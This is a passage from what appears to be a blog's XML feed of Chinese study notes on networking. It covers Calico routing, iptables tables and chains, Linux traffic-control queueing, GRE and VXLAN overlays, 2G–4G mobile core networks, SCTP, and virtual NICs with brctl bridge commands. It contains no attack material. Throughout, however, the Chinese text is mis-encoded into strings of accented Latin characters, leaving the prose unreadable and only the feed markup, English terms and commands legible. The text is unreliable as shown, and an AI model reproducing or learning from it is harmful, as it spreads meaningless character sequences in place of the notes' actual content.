agentï¼Œå½“åˆ›å»ºå’Œåˆ é™¤å®¹å™¨çš„æ—¶å€™ï¼Œé…ç½®ä¸€æ¡æŒ‡å‘è¯¥å®¹å™¨çš„è·¯ç”±ã€‚è¿™ä¸ª agent åœ¨ Calico ä¸­ç§°ä¸º Felixã€‚<br>è·¯ç”±å¹¿æ’­ç»„ä»¶BGP Speakerï¼šå°†è¯¥èŠ‚ç‚¹çš„è·¯ç”±ä¿¡æ¯è¿›è¡Œå¹¿æ’­ï¼›<br>å®‰å…¨ç­–ç•¥ç»„ä»¶ï¼šæ§åˆ¶ä»»æ„å®¹å™¨ç½‘ç»œçš„è¿é€šï¼›<br>BGP Route Reflectorï¼šèŠ‚ç‚¹æ•°å¤šæ—¶ï¼Œä¸ºé™ä½ç½‘ç»œå¤æ‚æ€§ï¼ŒBGP Speakerä¼šç›´è¿ä¸€ä¸ªBGP Route Reflectorï¼Œè®©å®ƒè´Ÿè´£å¹¿æ’­å…¨ç½‘è·¯ç”±ä¿¡æ¯ï¼›è§„æ¨¡æ›´å¤§æ—¶ï¼Œä½¿ç”¨å¤šä¸ª BGP Router Reflectorï¼Œæ¯ä¸ª BGP Router Reflector ç®¡ä¸€éƒ¨åˆ†ï¼ŒæœåŠ¡å™¨å’Œ BGP Router Reflector ä¹‹é—´ä½¿ç”¨çš„æ˜¯æ•°æ®ä¸­å¿ƒå†…éƒ¨çš„è·¯ç”±åè®® iBGPï¼ŒBGP Router Reflector ä¹‹é—´ä½¿ç”¨çš„æ˜¯æ•°æ®ä¸­å¿ƒä¹‹é—´çš„è·¯ç”±åè®® eBGPã€‚<br>è·¨ç½‘æ®µè®¿é—®é—®é¢˜ï¼šCalicoçš„IPIPæ¨¡å¼ï¼Œåœ¨ä¸¤å°ç‰©ç†æœºç›´æ¥å»ºç«‹éš§é“ï¼Œå®¹å™¨IPä½œä¸ºä¹˜å®¢åè®®æ”¾åœ¨éš§é“å†…ï¼Œç‰©ç†æœºIPä½œä¸ºæ‰¿è½½åè®®ã€‚ä¸ç®¡å¤–å±‚çš„ IP é€šè¿‡ä¼ ç»Ÿçš„ç‰©ç†ç½‘ç»œï¼Œèµ°å¤šå°‘è·³åˆ°è¾¾ç›®æ ‡ç‰©ç†æœºï¼Œä»éš§é“ä¸¤ç«¯çœ‹èµ·æ¥ï¼Œç‰©ç†æœº A çš„ä¸‹ä¸€è·³å°±æ˜¯ç‰©ç†æœº Bï¼Œä»è€Œå®ç°äº†å®¹å™¨ç½‘ç»œçš„è·¨ç½‘æ®µè®¿é—®ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>å®¹å™¨ç½‘ç»œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š26-28è®²</title>
    <link href="/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A26-28%E8%AE%B2/"/>
    <url>/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A26-28%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="ç½‘ç»œä¼ è¾“èŠ‚ç‚¹ï¼š"><a href="#ç½‘ç»œä¼ è¾“èŠ‚ç‚¹ï¼š" class="headerlink" title="ç½‘ç»œä¼ è¾“èŠ‚ç‚¹ï¼š"></a>ç½‘ç»œä¼ è¾“èŠ‚ç‚¹ï¼š</h3><h4 id="å½“ä¸€ä¸ªæ•°æ®åŒ…è¿›å…¥ä¸€å°è®¾å¤‡çš„æ—¶å€™ï¼Œä¼šç»å†ä¸€ä¸‹5ä¸ªèŠ‚ç‚¹ï¼š"><a href="#å½“ä¸€ä¸ªæ•°æ®åŒ…è¿›å…¥ä¸€å°è®¾å¤‡çš„æ—¶å€™ï¼Œä¼šç»å†ä¸€ä¸‹5ä¸ªèŠ‚ç‚¹ï¼š" class="headerlink" title="å½“ä¸€ä¸ªæ•°æ®åŒ…è¿›å…¥ä¸€å°è®¾å¤‡çš„æ—¶å€™ï¼Œä¼šç»å†ä¸€ä¸‹5ä¸ªèŠ‚ç‚¹ï¼š"></a>å½“ä¸€ä¸ªæ•°æ®åŒ…è¿›å…¥ä¸€å°è®¾å¤‡çš„æ—¶å€™ï¼Œä¼šç»å†ä¸€ä¸‹5ä¸ªèŠ‚ç‚¹ï¼š</h4><p>1ï¼‰preroutingï¼šè·¯ç”±åˆ¤æ–­å‰ï¼›2ï¼‰inputï¼šIPä¸æœ¬åœ°åŒ¹é…ï¼Œæ•°æ®åŒ…ä¼ å…¥ä¼ è¾“å±‚ï¼›3ï¼‰forwardï¼šIPä¸åŒ¹é…ï¼Œè½¬å‘æ•°æ®åŒ…ï¼›4ï¼‰outputï¼šä¼ è¾“å±‚ï¼ˆä¸Šå±‚ï¼‰å¤„ç†åè¿”å›å¤„ç†ç»“æœï¼›5ï¼‰postroutingï¼šè·¯ç”±åˆ¤æ–­åçš„èŠ‚ç‚¹ï¼ˆforwardï¼ŒoutputèŠ‚ç‚¹ä¹‹åï¼‰<br>Netfilterï¼šåœ¨ä¸Šè¿°èŠ‚ç‚¹æ’å…¥hookå‡½æ•°ï¼Œå¹²é¢„æ•°æ®åŒ…ä¼ è¾“ï¼ˆæ¥æ”¶ã€ä¸¢å¼ƒã€å‘é€ç»™ç”¨æˆ·æ€è¿›ç¨‹å¤„ç†ï¼‰ï¼›linuxå†…æ ¸æ¨¡å—ip_tableså°±æ˜¯ä¾èµ–è¯¥æ¡†æ¶å®ç°ï¼›<br>iptablesï¼šå®¢æˆ·ç«¯ç¨‹åºï¼Œä½¿ç”¨å‘½ä»¤è¡Œå¹²é¢„å†…æ ¸ip_tablesè§„åˆ™ï¼›å…·å¤‡è¡¨å’Œé“¾çš„æ¦‚å¿µï¼›<br>iptablesè¡¨ï¼šraw-mangle-nat-filter<br>filterè¡¨ï¼šå¤„ç†è¿‡æ»¤åŠŸèƒ½ï¼Œä¸»è¦åŒ…å«ä¸‰ä¸ªé“¾ï¼š1ï¼‰inputé“¾ï¼šè¿‡æ»¤æ‰€æœ‰ç›®æ ‡åœ°å€æ˜¯æœ¬æœºçš„æ•°æ®åŒ…ï¼›2ï¼‰forwardé“¾ï¼šè¿‡æ»¤æ‰€æœ‰ç»è¿‡æœ¬æœºçš„æ•°æ®åŒ…ï¼›3ï¼‰outputé“¾ï¼šè¿‡æ»¤æ‰€æœ‰æœ¬æœºäº§ç”Ÿçš„æ•°æ®åŒ…ï¼›<br>natè¡¨ï¼šä¸»è¦æ˜¯å¤„ç†ç½‘ç»œåœ°å€ï¼ˆæºã€ç›®ï¼‰è½¬æ¢ï¼ŒåŒ…å«ä¸‰ä¸ªé“¾ï¼š1ï¼‰preroutingé“¾ï¼šåœ¨æ•°æ®åŒ…åˆ°è¾¾é˜²ç«å¢™æ—¶æ”¹å˜ç›®æ ‡åœ°å€ï¼›2ï¼‰outputé“¾ï¼šæ”¹å˜æœ¬æœºäº§ç”Ÿçš„æ•°æ®åŒ…çš„ç›®æ ‡åœ°å€ï¼›3ï¼‰postroutingé“¾ï¼šåœ¨æ•°æ®åŒ…ç¦»å¼€é˜²ç«å¢™æ—¶æ›´æ”¹æ•°æ®åŒ…æºåœ°å€ï¼›<br>mangleè¡¨ï¼šä¸»è¦æ˜¯ä¿®æ”¹æ•°æ®åŒ…ï¼ŒåŒ…å«preroutingé“¾ã€inputé“¾ã€forwardé“¾ã€outputé“¾ã€postroutingé“¾ï¼›</p><h3 id="QoSï¼ˆæœåŠ¡è´¨é‡ï¼‰æ§åˆ¶ï¼š"><a href="#QoSï¼ˆæœåŠ¡è´¨é‡ï¼‰æ§åˆ¶ï¼š" class="headerlink" title="QoSï¼ˆæœåŠ¡è´¨é‡ï¼‰æ§åˆ¶ï¼š"></a>QoSï¼ˆæœåŠ¡è´¨é‡ï¼‰æ§åˆ¶ï¼š</h3><p>Linuxå¯é€šè¿‡TCæ§åˆ¶ç½‘ç»œçš„QoSï¼Œä¸»è¦é€šè¿‡é˜Ÿåˆ—æ–¹å¼</p><h3 id="æ— ç±»åˆ«æ’é˜Ÿè§„åˆ™ï¼š"><a href="#æ— ç±»åˆ«æ’é˜Ÿè§„åˆ™ï¼š" class="headerlink" title="#æ— ç±»åˆ«æ’é˜Ÿè§„åˆ™ï¼š"></a>#æ— ç±»åˆ«æ’é˜Ÿè§„åˆ™ï¼š</h3><p>1.1ã€pfifo_fastæŠ€æœ¯ï¼Œåˆ†ä¸ºä¸‰ä¸ªé˜Ÿåˆ—ï¼ˆBandï¼‰ï¼Œå…·å¤‡ä¼˜å…ˆçº§ï¼Œæ ¹æ®ç½‘ç»œåŒ…é‡Œçš„TOSï¼Œåˆ¤æ–­è¿›å…¥çš„é˜Ÿåˆ—ï¼Œå¤„äºä¼˜å…ˆçº§é«˜çš„é˜Ÿåˆ—ä¼˜å…ˆå‘é€ï¼›<br>1.2ã€éšæœºå…¬å¹³é˜Ÿåˆ—ï¼šå»ºç«‹å¾ˆå¤šçš„ FIFO çš„é˜Ÿåˆ—ï¼ŒTCP Session ä¼šè®¡ç®— hash å€¼ï¼Œé€šè¿‡ hash å€¼åˆ†é…åˆ°æŸä¸ªé˜Ÿåˆ—ã€‚åœ¨é˜Ÿåˆ—çš„å¦ä¸€ç«¯ï¼Œç½‘ç»œåŒ…ä¼šé€šè¿‡è½®è¯¢ç­–ç•¥ä»å„ä¸ªé˜Ÿåˆ—ä¸­å–å‡ºå‘é€ã€‚è¿™æ ·ä¸ä¼šæœ‰ä¸€ä¸ª Session å æ®æ‰€æœ‰çš„æµé‡<br>1.3ã€ä»¤ç‰Œæ¡¶è§„åˆ™ï¼ˆTBFï¼‰ï¼šæ‰€æœ‰çš„ç½‘ç»œåŒ…æ’æˆé˜Ÿåˆ—ï¼Œæ‹¿åˆ°ä»¤ç‰Œæ‰èƒ½å‘é€ã€‚ä»¤ç‰Œæ ¹æ®è®¾å®šçš„é€Ÿåº¦ç”Ÿæˆï¼Œå³ä¾¿é˜Ÿåˆ—å¾ˆé•¿ï¼Œä¹Ÿæ˜¯æŒ‰ç…§ä¸€å®šçš„é€Ÿåº¦è¿›è¡Œå‘é€çš„ï¼Œä»¤ç‰Œä¹Ÿä¸æ— é™ç”Ÿæˆï¼Œä»¤ç‰Œæ¡¶æ”¾æ»¡å³ä¸å†ç”Ÿæˆï¼Œé˜²æ­¢ä»¤ç‰Œå¤§é‡ç§¯ç´¯ï¼Œå‡ºç°æµé‡æ¿€å¢ã€‚</p><h4 id="åŸºäºç±»åˆ«çš„é˜Ÿåˆ—è§„åˆ™ï¼š"><a href="#åŸºäºç±»åˆ«çš„é˜Ÿåˆ—è§„åˆ™ï¼š" class="headerlink" title="åŸºäºç±»åˆ«çš„é˜Ÿåˆ—è§„åˆ™ï¼š"></a>åŸºäºç±»åˆ«çš„é˜Ÿåˆ—è§„åˆ™ï¼š</h4><p>2.1ã€åˆ†å±‚ä»¤ç‰Œæ¡¶è§„åˆ™ï¼ˆHTBï¼‰ï¼šTC å¯ä»¥ä¸ºæŸä¸ªç½‘å¡ eth0 åˆ›å»ºä¸€ä¸ª HTB çš„é˜Ÿåˆ—è§„åˆ™ï¼Œç„¶åå¯¹è¯¥rootåˆ›å»ºåˆ†æ”¯ï¼Œæ¯ä¸ªåˆ†æ”¯æœ‰å›ºå®šçš„ä¸¤ä¸ªå‘é€é€Ÿåº¦ï¼›åŒä¸€ä¸ª root ä¸‹çš„å­ç±»ï¼ˆåˆ†æ”¯ï¼‰å¯ä»¥ç›¸äº’å€Ÿæµé‡ï¼Œä¸æµªè´¹å¸¦å®½ï¼›<br>äº‘ä¸­ç½‘ç»œ Openvswitch ä¸­ï¼Œä¸»è¦ä½¿ç”¨çš„æ˜¯åˆ†å±‚ä»¤ç‰Œæ¡¶è§„åˆ™ï¼ˆHTBï¼‰ï¼Œå°†æ€»çš„å¸¦å®½åœ¨ä¸€æ£µæ ‘ä¸ŠæŒ‰ç…§é…ç½®çš„æ¯”ä¾‹è¿›è¡Œåˆ†é…ï¼Œå¹¶ä¸”åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥å€Ÿç»™å¦å¤–çš„åˆ†æ”¯ï¼Œä»è€Œå¢å¼ºå¸¦å®½åˆ©ç”¨ç‡</p><h3 id="äº‘ä¸­çš„ç½‘ç»œéš”ç¦»ï¼š"><a href="#äº‘ä¸­çš„ç½‘ç»œéš”ç¦»ï¼š" class="headerlink" title="äº‘ä¸­çš„ç½‘ç»œéš”ç¦»ï¼š"></a>äº‘ä¸­çš„ç½‘ç»œéš”ç¦»ï¼š</h3><p>Underlayç½‘ç»œï¼šåº•å±‚çš„ç‰©ç†ç½‘ç»œè®¾å¤‡ç»„æˆçš„ç½‘ç»œï¼›<br>Overlayç½‘ç»œï¼šåŸºäºç‰©ç†ç½‘ç»œçš„è™šæ‹ŸåŒ–ç½‘ç»œå®ç°ï¼›</p><h4 id="OverlayæŠ€æœ¯ä¸€ï¼šGREï¼ˆ-Generic-Routing-Encapsulationï¼‰ï¼š"><a href="#OverlayæŠ€æœ¯ä¸€ï¼šGREï¼ˆ-Generic-Routing-Encapsulationï¼‰ï¼š" class="headerlink" title="OverlayæŠ€æœ¯ä¸€ï¼šGREï¼ˆ Generic Routing Encapsulationï¼‰ï¼š"></a>OverlayæŠ€æœ¯ä¸€ï¼šGREï¼ˆ Generic Routing Encapsulationï¼‰ï¼š</h4><p>å°†IPåŒ…å°è£…åœ¨GREåŒ…é‡Œï¼Œå¤–éƒ¨å†åŠ ä¸ŠIPå¤´ï¼Œå½¢æˆä¸€ä¸ªè™šæ‹Ÿçš„ç‚¹å¯¹ç‚¹çš„è¿æ¥éš§é“ï¼Œç”±å…·å¤‡è·¯ç”±åŠŸèƒ½çš„è®¾å¤‡å¦‚è·¯ç”±å™¨è¿›è¡Œå°è£…ã€è§£å°æ•°æ®åŒ…ï¼›<br>GREç¼ºç‚¹ï¼š1ï¼‰GREæ˜¯ç‚¹å¯¹ç‚¹éš§é“ï¼Œæ¯ä¸ªè™šæ‹Ÿç½‘ç»œé—´éœ€è¦å»ºç«‹ä¸€ä¸ªéš§é“ï¼Œéš§é“æ•°ç›®éšç½‘ç»œæ•°å‘ˆæŒ‡æ•°å¢é•¿ï¼›2ï¼‰GREä¸æ”¯æŒç»„æ’­ï¼ŒGREä¼šå°†å¹¿æ’­å¸§å¹¿æ’­åˆ°æ‰€æœ‰ä¸è¯¥èŠ‚ç‚¹æœ‰éš§é“è¿æ¥çš„èŠ‚ç‚¹ï¼›3ï¼‰å¾ˆå¤šé˜²ç«å¢™å’Œä¸‰å±‚ç½‘ç»œè®¾å¤‡æ— æ³•è§£æGREï¼›</p><h4 id="OverlayæŠ€æœ¯äºŒï¼šVXLANï¼š"><a href="#OverlayæŠ€æœ¯äºŒï¼šVXLANï¼š" class="headerlink" title="OverlayæŠ€æœ¯äºŒï¼šVXLANï¼š"></a>OverlayæŠ€æœ¯äºŒï¼šVXLANï¼š</h4><p>VXLANå°è£…çš„æ˜¯äºŒå±‚æ•°æ®å¸§ï¼Œåœ¨äºŒå±‚å¤–å°è£…ä¸€ä¸ªVXLANå¤´ï¼ŒåŒ…å«24ä½VXLAN IDï¼Œåœ¨VXLANå¤´éƒ¨å¤–è¿˜å°è£…äº†UDPã€IPã€MACå¤´éƒ¨ï¼›<br>VTEPï¼ˆVXLAN Tunnel Endpointï¼‰ï¼šå®ç°å°è£…å’Œè§£å°VXLANæ•°æ®åŒ…çš„èŠ‚ç‚¹ç§°ä¸ºVTEPï¼›VTEPé€šè¿‡ç»„æ’­å®šä½ç›®æ ‡æœºå™¨ï¼Œä¸æ˜¯ç‚¹å¯¹ç‚¹ï¼›<br>OpenvSwitch æ”¯æŒä¸‰ç±»éš§é“ï¼šGREã€VXLANã€IPsec_GREã€‚åœ¨ä½¿ç”¨ OpenvSwitch çš„æ—¶å€™ï¼Œè™šæ‹Ÿäº¤æ¢æœºå°±ç›¸å½“äº GRE å’Œ VXLAN å°è£…çš„ç«¯ç‚¹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>äº‘ä¸­ç½‘ç»œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š23-25è®²</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A23-25%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A23-25%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="ç§»åŠ¨ç½‘ç»œï¼š"><a href="#ç§»åŠ¨ç½‘ç»œï¼š" class="headerlink" title="ç§»åŠ¨ç½‘ç»œï¼š"></a>ç§»åŠ¨ç½‘ç»œï¼š</h3><h4 id="2Gæ—¶ä»£ä¸Šç½‘ï¼š"><a href="#2Gæ—¶ä»£ä¸Šç½‘ï¼š" class="headerlink" title="2Gæ—¶ä»£ä¸Šç½‘ï¼š"></a>2Gæ—¶ä»£ä¸Šç½‘ï¼š</h4><p>1ï¼‰æ‰‹æœºé€šè¿‡æ— çº¿ä¿¡å·è¿æ¥åŸºç«™ï¼›2ï¼‰åŸºç«™ä¸€é¢æ¥æ— çº¿ï¼Œä¸€é¢æ¥æ ¸å¿ƒç½‘ï¼›3ï¼‰æ ¸å¿ƒç½‘ä¸€é¢æ¥åŸºç«™è¯·æ±‚ï¼Œåˆ¤æ–­æ˜¯å¦åˆæ³•ç­‰ï¼Œä¸€é¢é€šè¿‡ç½‘å…³æ¥ç”µè¯ç½‘ç»œï¼›</p><h4 id="2-5Gç½‘ç»œï¼š"><a href="#2-5Gç½‘ç»œï¼š" class="headerlink" title="2.5Gç½‘ç»œï¼š"></a>2.5Gç½‘ç»œï¼š</h4><p>åœ¨2Gçš„ç½‘ç»œåŸºç¡€ä¸ŠåŠ å…¥äº†åˆ†ç»„äº¤æ¢ä¸šåŠ¡ï¼›åœ¨åŸºç«™æ¥æ ¸å¿ƒç½‘çš„ç»„ä»¶ä¸­ï¼Œå¤šäº†åˆ†ç»„æ§åˆ¶ç«¯å…ƒï¼Œæä¾›åˆ†ç»„äº¤æ¢é€šé“ï¼›åœ¨æ ¸å¿ƒç½‘é‡Œé¢ï¼Œæœ‰ä¸ªæœå‰çš„æ¥å¾…å‘˜ï¼ˆSGSNï¼ŒService GPRS Supported Nodeï¼‰å’Œæœåè¿æ¥IP ç½‘ç»œçš„ç½‘å…³å‹ GPRS æ”¯æŒèŠ‚ç‚¹ï¼ˆGGSNï¼ŒGateway GPRS Supported Nodeï¼‰ã€‚</p><h4 id="3Gç½‘ç»œï¼š"><a href="#3Gç½‘ç»œï¼š" class="headerlink" title="3Gç½‘ç»œï¼š"></a>3Gç½‘ç»œï¼š</h4><p>ä¸»è¦æ˜¯å¢åŠ äº†æ— çº¿çš„å¸¦å®½</p><h4 id="4Gç½‘ç»œï¼š"><a href="#4Gç½‘ç»œï¼š" class="headerlink" title="4Gç½‘ç»œï¼š"></a>4Gç½‘ç»œï¼š</h4><p>æ‰‹æœºç›´æ¥é€šè¿‡ eNodeB è¿æ¥ SGWï¼Œè¿ä¸Šæ ¸å¿ƒç½‘ï¼ŒSGW ç›¸å½“äºæ•°æ®é¢çš„æ¥å¾…å‘˜ï¼Œå¹¶é€šè¿‡PGW è¿åˆ° IP ç½‘ç»œã€‚PGW å°±æ˜¯å‡ºå£ç½‘å…³ã€‚åœ¨å‡ºå£ç½‘å…³ï¼Œæœ‰ä¸€ä¸ªç»„ä»¶ PCRFï¼Œç§°ä¸ºç­–ç•¥å’Œè®¡è´¹æ§åˆ¶å•å…ƒï¼Œç”¨æ¥æ§åˆ¶ä¸Šç½‘ç­–ç•¥å’Œæµé‡çš„è®¡è´¹ã€‚</p><h3 id="4Gç½‘ç»œåè®®-æ§åˆ¶é¢åè®®ï¼š"><a href="#4Gç½‘ç»œåè®®-æ§åˆ¶é¢åè®®ï¼š" class="headerlink" title="4Gç½‘ç»œåè®®-æ§åˆ¶é¢åè®®ï¼š"></a>4Gç½‘ç»œåè®®-æ§åˆ¶é¢åè®®ï¼š</h3><p>ä¸€ä¸ªæ‰‹æœºæƒ³ä¸Šç½‘çš„æ—¶å€™ï¼Œå…ˆè¦è¿æ¥ eNodeBï¼Œå¹¶é€šè¿‡ S1-MME æ¥å£ï¼Œè¯·æ±‚ MME å¯¹è¿™ä¸ªæ‰‹æœºè¿›è¡Œè®¤è¯å’Œé‰´æƒã€‚eNodeBå’ŒMMEä¹‹é—´ä½¿ç”¨SCTPåè®®è¿›è¡Œé€šä¿¡ã€‚SCTPç‰¹ç‚¹ï¼š1ï¼‰å¤šå®¿ä¸»ï¼Œå¼•å…¥è”åˆçš„æ¦‚å¿µï¼Œå°†å¤šä¸ªæ¥å£ã€å¤šæ¡è·¯å¾„æ”¾åˆ°ä¸€ä¸ªè”åˆä¸­æ¥ã€‚å½“æ£€æµ‹åˆ°ä¸€æ¡è·¯å¾„å¤±æ•ˆæ—¶ï¼Œåè®®å°±ä¼šé€šè¿‡å¦å¤–ä¸€æ¡è·¯å¾„æ¥å‘é€é€šä¿¡æ•°æ®ï¼Œä»è€Œä½¿ä¸€å°æœºå™¨æ”¯æŒå¤šä¸ªç½‘å¡ï¼›2ï¼‰å°†ä¸€ä¸ªè”åˆåˆ†æˆå¤šä¸ªæµï¼Œä¸€ä¸ªè”åˆä¸­çš„æ‰€æœ‰æµéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œä½†å‡ä¸è¯¥è”åˆç›¸å…³ã€‚æ¯ä¸ªæµéƒ½ç»™å®šäº†ä¸€ä¸ªæµç¼–å·ï¼Œå®ƒè¢«ç¼–ç åˆ° SCTP æŠ¥æ–‡ä¸­ï¼Œé€šè¿‡è”åˆåœ¨ç½‘ç»œä¸Šä¼ é€ã€‚3ï¼‰å››æ¬¡æ¡æ‰‹ï¼Œå¼•å…¥cookieæ¦‚å¿µï¼Œé˜²æ­¢SYNæ”»å‡»ï¼›4ï¼‰æ¶ˆæ¯åˆ†å¸§ï¼ŒSCTP å€Ÿé‰´äº† UDP çš„æœºåˆ¶ï¼Œåœ¨æ•°æ®ä¼ è¾“ä¸­æä¾›äº†æ¶ˆæ¯åˆ†å¸§åŠŸèƒ½ã€‚å½“ä¸€ç«¯å¯¹ä¸€ä¸ªå¥—æ¥å­—æ‰§è¡Œå†™æ“ä½œæ—¶ï¼Œå¯ç¡®ä¿å¯¹ç­‰ç«¯è¯»å‡ºçš„æ•°æ®å¤§å°ä¸æ­¤ç›¸åŒï¼›5ï¼‰æ–­å¼€è¿æ¥æ˜¯ä¸‰æ¬¡æŒ¥æ‰‹ï¼Œå½“ä¸€ç«¯å…³é—­è¿æ¥æ—¶ï¼Œä¸¤ç«¯éƒ½éœ€å…³é—­ã€‚</p><h3 id="4Gç½‘ç»œåè®®-æ•°æ®é¢åè®®ï¼š"><a href="#4Gç½‘ç»œåè®®-æ•°æ®é¢åè®®ï¼š" class="headerlink" title="4Gç½‘ç»œåè®®-æ•°æ®é¢åè®®ï¼š"></a>4Gç½‘ç»œåè®®-æ•°æ®é¢åè®®ï¼š</h3><p>æ•°æ®é¢çš„åè®®éƒ½æ˜¯é€šè¿‡ GTP-Uï¼Œåˆ†ä¸ºä¹˜å®¢åè®®ã€éš§é“åè®®ã€æ‰¿è½½åè®®ã€‚å…¶ä¸­ä¹˜å®¢åè®®æ˜¯æ‰‹æœºå‘å‡ºæ¥çš„åŒ…ï¼ŒIP æ˜¯æ‰‹æœºçš„ IPï¼Œéš§é“åè®®é‡Œé¢æœ‰éš§é“ IDï¼Œä¸åŒçš„æ‰‹æœºä¸Šçº¿ä¼šå»ºç«‹ä¸åŒçš„éš§é“ï¼Œå› è€Œéœ€è¦éš§é“ ID æ¥æ ‡è¯†ã€‚æ‰¿è½½åè®®çš„ IP åœ°å€æ˜¯ SGW å’Œ PGW çš„ IP åœ°å€ã€‚</p><h3 id="æ‰‹æœºä¸Šç½‘è¿‡ç¨‹ï¼š"><a href="#æ‰‹æœºä¸Šç½‘è¿‡ç¨‹ï¼š" class="headerlink" title="æ‰‹æœºä¸Šç½‘è¿‡ç¨‹ï¼š"></a>æ‰‹æœºä¸Šç½‘è¿‡ç¨‹ï¼š</h3><p>1ï¼‰å¯»æ‰¾å¹¶å‘é€Attach Requestç»™é™„è¿‘åŸºç«™eNodeBï¼›2ï¼‰eNodeB å°†è¯·æ±‚å‘ç»™ MMEï¼›3ï¼‰MME å»è¯·æ±‚æ‰‹æœºï¼Œä¸€æ˜¯è®¤è¯ï¼ŒäºŒæ˜¯é‰´æƒï¼Œè¿˜ä¼šè¯·æ±‚ HSS çœ‹çœ‹æœ‰æ²¡æœ‰é’±ï¼Œçœ‹çœ‹æ˜¯åœ¨å“ªé‡Œä¸Šç½‘ï¼›4ï¼‰è®¤è¯é€šè¿‡ï¼ŒMMEè¯·æ±‚SGWåˆ›å»ºä¼šè¯ã€åˆ†é…éš§é“ï¼›5ï¼‰SGWè¯·æ±‚PGWåˆ›å»ºä¼šè¯ã€åˆ†é…éš§é“ï¼›6ï¼‰PGWç­”å¤ï¼Œå¹¶åˆ›å»ºéš§é“ï¼Œæ ‡è®°æ‰‹æœºè¯·æ±‚ï¼›7ï¼‰SGWå›å¤MMEä¼šè¯åˆ›å»ºå®Œæˆï¼Œå›å¤éš§é“IDï¼›8ï¼‰MMEå›å¤eNodeBéš§é“åˆ›å»ºå®Œæˆï¼Œå›å¤éš§é“IDï¼›9ï¼‰eNodeBå›å¤MMEï¼Œè‡ªèº«åˆ†ç»™SGWçš„éš§é“IDï¼›10ï¼‰MME å°† eNodeB ç»™ SGW åˆ†é…çš„éš§é“ ID  å‘ŠçŸ¥ SGWï¼Œä»è€Œå‰é¢çš„éš§é“ä¹Ÿå»ºè®¾å®Œæ¯•ã€‚</p><h3 id="å¼‚åœ°ä¸Šç½‘é—®é¢˜ï¼š"><a href="#å¼‚åœ°ä¸Šç½‘é—®é¢˜ï¼š" class="headerlink" title="å¼‚åœ°ä¸Šç½‘é—®é¢˜ï¼š"></a>å¼‚åœ°ä¸Šç½‘é—®é¢˜ï¼š</h3><p>å¼‚åœ°ä¸Šç½‘æ—¶ï¼Œæ‰‹æœºè¯·æ±‚é™„è¿‘çš„eNodeBï¼Œå¹¶é€šè¿‡MMEå»æŸ¥è¯¢å›½å†…è¿è¥å•†çš„HSSï¼ŒéªŒè¯ç”¨æˆ·ä¿¡æ¯ï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œæ‰‹æœºä¼šä¸å¼‚åœ°çš„SGWå»ºç«‹éš§é“ï¼Œå¼‚åœ°çš„SGWå†ä¸å›½å†…è¿è¥å•†çš„PGWå»ºç«‹éš§é“ï¼Œç”±PGWå†…çš„PCRFç»„ä»¶è®¡ç®—ä¸Šç½‘æµé‡ï¼Œæ§åˆ¶ä¸Šç½‘ç­–ç•¥ã€‚å› æ­¤å¼‚åœ°ä¸Šç½‘æ—¶ï¼Œä¸Šç½‘ç­–ç•¥è¿˜æ˜¯ç”±å›½å†…è¿è¥å•†æ§åˆ¶çš„ã€‚</p><h3 id="è™šæ‹Ÿç½‘å¡ï¼š"><a href="#è™šæ‹Ÿç½‘å¡ï¼š" class="headerlink" title="è™šæ‹Ÿç½‘å¡ï¼š"></a>è™šæ‹Ÿç½‘å¡ï¼š</h3><p>é€šè¿‡Linuxä¸Šçš„TUN/TAPæŠ€æœ¯å®ç°<br>###è™šæ‹Ÿæœºé—´é€šä¿¡ï¼š<br>åœ¨Linux ä¸Šé€šè¿‡ brctlå‘½ä»¤åˆ›å»ºè™šæ‹Ÿçš„ç½‘æ¡¥ brctl addbr br0ã€‚å†å°†ä¸¤ä¸ªè™šæ‹Ÿæœºçš„è™šæ‹Ÿç½‘å¡ï¼Œéƒ½è¿æ¥åˆ°è™šæ‹Ÿç½‘æ¡¥ brctladdif br0 tap0 ä¸Šï¼Œè¿™æ 